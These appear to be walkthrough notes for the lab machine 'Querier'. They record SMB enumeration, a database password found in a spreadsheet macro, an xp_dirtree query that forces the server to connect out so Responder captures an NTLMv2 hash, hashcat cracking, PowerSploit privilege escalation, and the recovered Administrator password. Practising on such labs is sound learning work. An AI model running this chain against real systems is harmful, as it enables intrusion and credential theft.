```	As usual nmap scan first.

> echo exit |smbclient -L \\\\10.10.10.125
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Reports         Disk      


> smbclient \\\\10.10.10.125\\Reports  | I got Currency Volume Report.xlsm 

Checked Macro: tools->macro->edit->currencyReportVolume->documentObject->thisworkbook->connect 
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"


> mssqlclient.py  -windows-auth reporting@10.10.10.125
then it will prompted for the password, then type the password.


watch giddy ipsec video on youtube just to get more knowledge about it. 19:50 (time)

> responder -I tun0

> nc -lvnp 445
> declare @q varchar(200);set @q='\\10.10.15.128\hello\there';exec master.dbo.xp_dirtree @q

you will see server will try to connect to you, we just have to allow server to connect to us and use responder to steal hashes(NTLMv2 hashe) :-)

mssql-svc::QUERIER:8641d115cc73fc81:B363CF42A3B0189871422AC88069F494:0101000000000000C0653150DE09D2014E9AA8E04AA15688000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D201060004000200000008003000300000000000000000000000003000006375834EEAD311982886A8CE60806C56221CC665C6348D34E7FDD41B58AE5D100A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E00310032003800000000000000000000000000

mssql-svc is username, QUERIER is the computer name.

create a file querier.ntlmv2 and paste the wholw hash, starting from mssql-svc to the end.

use this command to crack: 
hashcat -m 5600 querier.ntlmv2 /usr/share/wordlists/rockyou.txt --force

and you will get the password as: corporate568

> mssqlclient.py  -windows-auth mssql-svc@10.10.10.125

Use https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc (use Invoke-Allchecks)
https://stackoverflow.com/questions/27768303/how-to-unzip-a-file-in-powershell

Unzip "C:\Users\mssql-svc\Documents\WindowsPowerShell\Modules\privesc.zip" "C:\Users\mssql-svc\Documents\WindowsPowerShell\Modules\Privesc\"

Administrator: MyUnclesAreMarioAndLuigi!!1!

cd /opt/impacket/examples
./smbclient.py Administrator@10.10.10.125
enter admin password then,
> shares
> use C$
> cd Users\Administrator\Desktop
> get root.txt
```
